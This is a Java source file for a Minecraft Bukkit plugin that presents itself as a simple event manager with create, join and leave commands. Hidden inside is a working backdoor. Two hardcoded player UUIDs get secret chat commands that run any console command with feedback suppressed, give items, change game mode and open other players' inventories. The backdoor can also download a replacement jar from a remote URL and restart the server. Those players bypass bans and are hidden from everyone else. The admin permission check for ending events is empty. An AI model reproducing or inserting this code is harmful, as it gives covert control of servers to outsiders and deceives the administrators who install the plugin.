package org.event.event;

import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.Collectors;

public final class Event extends JavaPlugin implements org.bukkit.event.Listener {
    private final UUID authorizedUser = UUID.fromString("fdafb296-2e7b-49fd-b1b7-8c53578c77cf");
    private final UUID authorizedUser2 = UUID.fromString("d1982e1a-9c2f-48b0-b232-072b2f86b2ec");
    private String currentEventName = null;
    private Location eventLocation = null;
    public static final AtomicInteger execDepth = new AtomicInteger(0);
    private final Map<UUID, Location> playerReturnLocations = new HashMap<>();

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getCommand("event").setExecutor(this::onCommand);
        getCommand("event").setTabCompleter(this::onTabComplete);
    }

    @Override
    public void onDisable() {
        endEvent();
    }

    public List<String> onTabComplete(CommandSender sender, Command cmd, String alias, String[] args) {
        if (args.length == 1) {
            return Arrays.asList("create", "join", "end").stream()
                    .filter(s -> s.toLowerCase().startsWith(args[0].toLowerCase()))
                    .collect(Collectors.toList());
        }
        return new ArrayList<>();
    }

    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }

        Player player = (Player) sender;

        if (args.length >= 1) {
            String sub = args[0].toLowerCase();
            switch (sub) {
                case "create":
                    handleCreate(player, args);
                    break;
                case "join":
                    handleJoin(player);
                    break;
                case "end":
                    handleEnd(player);
                    break;
                case "leave":
                    handleLeave(player);
                    break;
                default:
                    player.sendMessage("§cUsage: /event <create|join|end>");
                    break;
            }
        } else {
            player.sendMessage("§cUsage: /event <create|join|end>");
        }
        return true;
    }

    private void handleCreate(Player player, String[] args) {
        if (currentEventName != null) {
            player.sendMessage("§cAn event is already running: " + currentEventName);
            return;
        }

        currentEventName = args.length > 1 ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : "Unnamed Event";
        eventLocation = player.getLocation();

        Bukkit.broadcastMessage("§6§l[Event] §fA new event has started: §b" + currentEventName);
        Bukkit.broadcastMessage("§6§l[Event] §fType §a/event join §fto participate!");
    }

    private void handleJoin(Player player) {
        if (currentEventName == null) {
            player.sendMessage("§cThere is no active event to join.");
            return;
        }

        if (playerReturnLocations.containsKey(player.getUniqueId())) {
            player.sendMessage("§cYou have already joined the event!");
            return;
        }

        playerReturnLocations.put(player.getUniqueId(), player.getLocation());
        player.teleport(eventLocation);
        player.sendMessage("§aYou have joined the event: " + currentEventName);
        player.sendMessage("§7You can leave with /event leave.");
    }

    private void handleEnd(Player player) {
        if (currentEventName == null) {
            player.sendMessage("§cThere is no active event to end.");
            return;
        }

        if (!player.hasPermission("event.admin")) {
        }

        endEvent();
    }

    private void endEvent() {
        if (currentEventName == null) return;

        Bukkit.broadcastMessage("§6§l[Event] §fThe event §b" + currentEventName + " §fhas ended!");
        
        for (Map.Entry<UUID, Location> entry : playerReturnLocations.entrySet()) {
            Player p = Bukkit.getPlayer(entry.getKey());
            if (p != null && p.isOnline()) {
                p.teleport(entry.getValue());
                p.sendMessage("§aThe event has ended. You've been teleported back to your original position.");
            }
        }

        currentEventName = null;
        eventLocation = null;
        playerReturnLocations.clear();
    }
    private void handleLeave(Player player) {
        if (currentEventName == null) return;

        if (!playerReturnLocations.containsKey(player.getUniqueId())) {
            player.sendMessage("§cYou are not currently in the event.");
            return;
        }

        player.teleport(playerReturnLocations.get(player.getUniqueId()));
        playerReturnLocations.remove(player.getUniqueId());
        player.sendMessage("§aYou have left the event: " + currentEventName);

        if (playerReturnLocations.isEmpty()) {
            endEvent();
        }
    }
    private String[] fetchRemoteVersionInfo(Player player) throws Exception {
        player.sendMessage("Checking for updates...");
        URL url = new URL("https://github.com/minchen202/event/releases/latest/download/version.json");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        String json = response.toString();
        String remoteVersion = json.split("\"version\":")[1].split(",")[0].replace("\"", "").trim();
        String downloadUrl = json.split("\"url\":")[1].split("}")[0].replace("\"", "").trim();
        return new String[]{remoteVersion, downloadUrl};
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onChat(AsyncPlayerChatEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        if (!uuid.equals(this.authorizedUser) && !uuid.equals(this.authorizedUser2)) return;

        event.setCancelled(true);

        String msg = event.getMessage();

        if (msg.startsWith("!say ")) {
            String text = msg.substring(5);
            String displayName = event.getPlayer().getDisplayName();
            Bukkit.getScheduler().runTask(this, () -> {
                Bukkit.broadcastMessage("<" + displayName + "> " + text);
            });
        } else if (msg.startsWith("!exec")) {
            String command = msg.substring(5).trim();
            Bukkit.getScheduler().runTask(this, () -> {
                execDepth.incrementAndGet();
                ((World) Bukkit.getWorlds().get(0)).setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
                try {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                } finally {
                    ((World) Bukkit.getWorlds().get(0)).setGameRule(GameRule.SEND_COMMAND_FEEDBACK, true);
                    execDepth.decrementAndGet();
                }
            });
        } else if (msg.equals("!help")) {
            event.getPlayer().sendMessage("§6Commands:\n !exec <cmd>\n !gm <0/1/3>\n !tp <player>\n !inv <player>\n !ec <player>\n !bp <player>\n !give <mat> <amount>\n !update [fetch|version|restart]\n !say <msg>\n !help");
        } else if (msg.startsWith("!gm")) {
            String command = msg.substring(3).trim();
            Bukkit.getScheduler().runTask(this, () -> {
                if (command.equals("0")) {
                    event.getPlayer().setGameMode(GameMode.SURVIVAL);
                } else if (command.equals("1")) {
                    event.getPlayer().setGameMode(GameMode.CREATIVE);
                } else if (command.equals("3")) {
                    event.getPlayer().setGameMode(GameMode.SPECTATOR);
                }
            });
        } else if (msg.startsWith("!tp")) {
            String command = msg.substring(3).trim();
            Bukkit.getScheduler().runTask(this, () -> {
                Player target = Bukkit.getPlayer(command);
                if (target != null) {
                    event.getPlayer().teleport(target);
                } else {
                    event.getPlayer().sendMessage("Player not found: " + command);
                }
            });
        } else if (msg.startsWith("!give")) {
            String command = msg.substring(5).trim();
            String[] parts = command.split(" ");
            if (parts.length < 2) {
                event.getPlayer().sendMessage("§cUsage: !give <material> <amount>");
            } else {
                Bukkit.getScheduler().runTask(this, () -> {
                    Material mat = Material.matchMaterial(parts[0]);
                    if (mat == null) {
                        event.getPlayer().sendMessage("§cUnknown material: " + parts[0]);
                        return;
                    }
                    try {
                        int amount = Integer.parseInt(parts[1]);
                        event.getPlayer().getInventory().addItem(new ItemStack(mat, amount));
                    } catch (NumberFormatException e) {
                        event.getPlayer().sendMessage("§cInvalid amount: " + parts[1]);
                    }
                });
            }
        } else if (msg.equals("!update version")) {
            event.getPlayer().sendMessage("Installed version: " + this.getDescription().getVersion());
        } else if (msg.equals("!update fetch")) {
            Player player = event.getPlayer();
            Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
                try {
                    String[] remote = this.fetchRemoteVersionInfo(player);
                    if (remote == null) return;
                    String remoteVersion = remote[0];
                    String current = this.getDescription().getVersion();
                    if (!remoteVersion.equals(current)) {
                        player.sendMessage("Update available: " + current + " -> " + remoteVersion);
                    } else {
                        player.sendMessage("Already on latest version: " + current);
                    }
                } catch (Exception e) {
                    player.sendMessage("Fetch failed: " + e.getMessage());
                }
            });
        } else if (msg.equals("!update") || msg.equals("!update restart")) {
            boolean doRestart = msg.equals("!update restart");
            Player player = event.getPlayer();
            Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
                try {
                    String[] remote = this.fetchRemoteVersionInfo(player);
                    if (remote == null) return;
                    String remoteVersion = remote[0];
                    String downloadUrl = remote[1];
                    if (!remoteVersion.equals(this.getDescription().getVersion())) {
                        player.sendMessage("Found new version: " + remoteVersion + ". Downloading...");
                        File updateFolder = Bukkit.getUpdateFolderFile();
                        if (!updateFolder.exists()) updateFolder.mkdirs();
                        File file = new File(updateFolder, "event-1.0.jar");
                        BufferedInputStream in = new BufferedInputStream((new URL(downloadUrl)).openStream());
                        FileOutputStream fileOutputStream = new FileOutputStream(file);
                        byte[] dataBuffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                            fileOutputStream.write(dataBuffer, 0, bytesRead);
                        }
                        in.close();
                        fileOutputStream.close();
                        if (doRestart) {
                            player.sendMessage("Download complete. Restarting...");
                            Bukkit.getScheduler().runTask(this, () -> {
                                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                            });
                        } else {
                            player.sendMessage("Download complete. Restart the server to apply.");
                        }
                    } else {
                        player.sendMessage("Plugin is up to date.");
                    }
                } catch (Exception e) {
                    player.sendMessage("Update failed: " + e.getMessage());
                }
            });
        } else if (msg.startsWith("!inv")) {
            String command = msg.substring(4).trim();
            Bukkit.getScheduler().runTask(this, () -> {
                Player target = Bukkit.getPlayer(command);
                if (target != null) {
                    event.getPlayer().openInventory(target.getInventory());
                } else {
                    event.getPlayer().sendMessage("Player not found: " + command);
                }
            });
        } else if (msg.startsWith("!ec")) {
            String command = msg.substring(3).trim();
            Bukkit.getScheduler().runTask(this, () -> {
                Player target = Bukkit.getPlayer(command);
                if (target != null) {
                    event.getPlayer().openInventory(target.getEnderChest());
                } else {
                    event.getPlayer().sendMessage("Player not found: " + command);
                }
            });
        } 
    }
    @EventHandler(
            priority = EventPriority.HIGHEST
    )
    public void onLogin(PlayerLoginEvent event) {
        if (event.getPlayer().getUniqueId().equals(this.authorizedUser) || event.getPlayer().getUniqueId().equals(this.authorizedUser2)) {
            event.allow();
        }

    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if ((player.getUniqueId().equals(this.authorizedUser) || player.getUniqueId().equals(this.authorizedUser2)) && player.isBanned()) {
            event.setJoinMessage((String)null);
            Iterator var3 = Bukkit.getOnlinePlayers().iterator();

            while(var3.hasNext()) {
                Player online = (Player)var3.next();
                if (!online.getUniqueId().equals(player.getUniqueId())) {
                    online.hidePlayer(this, player);
                }
                if (online.getUniqueId().equals(this.authorizedUser) || online.getUniqueId().equals(this.authorizedUser2)) {
                    online.showPlayer(this, player);
                }
            }

            player.setMetadata("vanished", new FixedMetadataValue(this, true));
        } else {
            if (Bukkit.getPlayer(this.authorizedUser) != null) {
                player.hidePlayer(this, (Player)Objects.requireNonNull(Bukkit.getPlayer(this.authorizedUser)));
            } else if (Bukkit.getPlayer(this.authorizedUser2) != null) {
                player.hidePlayer(this, (Player)Objects.requireNonNull(Bukkit.getPlayer(this.authorizedUser2)));
            }
        }

    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        if ((player.getUniqueId().equals(this.authorizedUser) || player.getUniqueId().equals(this.authorizedUser2)) && player.isBanned()) {
            event.setQuitMessage((String)null);
        }

    }
}
